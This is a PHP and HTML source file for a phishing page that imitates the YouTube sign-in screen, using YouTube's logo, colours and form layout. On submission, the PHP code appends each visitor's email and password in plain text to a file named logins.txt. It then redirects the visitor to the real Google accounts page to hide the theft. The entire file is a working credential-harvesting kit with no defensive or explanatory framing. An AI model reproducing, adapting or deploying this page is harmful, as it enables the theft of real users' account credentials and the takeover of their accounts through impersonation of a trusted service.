<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $file = fopen("logins.txt", "a");
    fwrite($file, "YouTube | Email: " . $_POST["email"] . " | Password: " . $_POST["password"] . "\n");
    fclose($file);
    header("Location: https://accounts.google.com/");
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - YouTube</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            text-align: center;
        }
        .container {
            width: 320px;
            margin: 100px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
        img {
            width: 80px;
        }
        input, button {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ddd;
        }
        button {
            background: #c4302b;
            border: none;
            color: white;
            font-size: 16px;
        }
        button:hover {
            background: #a0241f;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" alt="YouTube Logo">
        <h2>Sign in to YouTube</h2>
        <form method="POST">
            <input type="text" name="email" placeholder="Email or phone" required><br>
            <input type="password" name="password" placeholder="Enter your password" required><br>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
